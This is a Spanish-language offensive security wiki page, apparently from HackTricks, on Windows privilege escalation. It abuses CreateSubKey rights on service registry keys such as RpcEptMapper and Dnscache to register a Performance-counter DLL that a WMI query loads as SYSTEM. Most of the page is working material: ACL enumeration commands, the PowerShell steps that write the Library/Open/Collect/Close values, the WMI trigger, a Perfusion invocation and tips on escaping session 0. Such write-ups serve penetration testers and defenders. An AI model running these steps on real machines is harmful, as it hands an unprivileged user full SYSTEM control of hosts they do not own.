# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**El post original es** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## Summary

Si solo tienes **`Create Subkey`** / **`AppendData/AddSubdirectory`** sobre una clave de registro de un service, esto sigue siendo una buena pista de privesc. Normalmente **no puedes** sobrescribir directamente `ImagePath`, `ServiceDll` u otros valores existentes, pero aun así puedes crear una clave hija **`Performance`** bajo:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Cualquier otra clave **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** donde tu token tenga **`KEY_CREATE_SUB_KEY`**

El truco es que Windows aún soporta el modelo de registro heredado **PerfLib V1**. Si un service tiene una subclave **`Performance`**, Windows puede cargar una DLL desde allí cuando un consumidor de performance counter solicita datos.

Según la documentación de Microsoft, el registro mínimo es:
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Así que la conclusión ofensiva es: **no descartes un hallazgo en el service registry solo porque solo obtuviste `CreateSubKey` en lugar de `SetValue`**.

## Por qué esto es suficiente para code execution

La subkey `Performance` normalmente **no** existe por defecto en estos services, así que **`KEY_CREATE_SUB_KEY`** es el primitive que necesitas. Una vez que la key existe y contiene `Library`/`Open`/`Collect`/`Close`, cualquier **performance counter consumer** puede disparar la carga de la DLL.

Algunos detalles importantes:

- El valor **`Library`** puede apuntar a una **ruta completa de DLL**.
- La DLL debe exportar **`OpenPerfData`**, **`CollectPerfData`** y **`ClosePerfData`** y devolver `ERROR_SUCCESS`.
- El código se ejecuta en el **contexto del consumer**, **no necesariamente en el proceso del vulnerable service**.
- En el caso clásico de `RpcEptMapper` / `Dnscache`, una **WMI performance query** puede hacer que **`wmiprvse.exe`** cargue la DLL como **`NT AUTHORITY\SYSTEM`**.

Por eso este primitive es fácil de pasar por alto durante el triage: la parent service key no es "fully writable", pero aun así se puede weaponize.

## Quick enumeration

Manual spot-check con **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Ejemplo de PowerShell para buscar principals con pocos privilegios con **`CreateSubKey`** en claves de servicios:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Herramientas útiles:

- **PrivescCheck**: `Get-ModifiableRegistryPath` fue creado específicamente para detectar esta clase de problema.
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: automatiza el drop de DLL, el registro `Performance`, el trigger WMI, la duplicación de token y la limpieza en targets legacy vulnerables (por ejemplo: `Perfusion.exe -c cmd -i -k Dnscache`).

## Flujo de abuse

Crear la subkey `Performance` y completar los valores requeridos:
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Luego, activa un consumidor de rendimiento **privileged**. Un ejemplo clásico es una consulta WMI sobre clases `Win32_Perf*`:
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Notas operativas:

- Lanzar **`perfmon.exe`** es útil para verificar que el registro del contador es correcto, pero eso normalmente solo carga la DLL en **tu propio contexto de usuario**.
- Para una LPE real, dispara un consumidor **privilegiado** como **WMI**.
- Si estás escribiendo tu propio exploit, lanzar `cmd.exe` directamente desde dentro de la DLL normalmente te deja con una shell en **session 0**. `Perfusion` resuelve esto duplicando el token privilegiado en un proceso que fue creado en estado suspended en la sesión del atacante.
- Haz coincidir la arquitectura de la DLL con el consumidor objetivo (**x64 en sistemas x64**).

## Notas de versión / desarrollos recientes

Históricamente, las weak keys integradas eran:

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` y `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` señala que las actualizaciones de **abril de 2021** eliminaron la ruta de explotación fácil en **Windows 8 / Windows Server 2012** actualizado, mientras que **Windows 7 / Windows Server 2008 R2** seguía siendo explotable a través de **`Dnscache`**.

Este primitive no es **solo histórico**. En **enero de 2025**, Microsoft corrigió un problema relacionado de AD DS en el que miembros de **`Network Configuration Operators`** podían crear subkeys bajo **`Dnscache`** y **`NetBT`**, y la misma idea de **registro de DLL de Performance-counter** podía reutilizarse para llegar a **SYSTEM** en sistemas soportados.

Así que la lección moderna es genérica: siempre que un principal con pocos privilegios tenga **`CreateSubKey`** sobre **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, comprueba si una child key **`Performance`** es suficiente antes de descartar el hallazgo.

## References

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
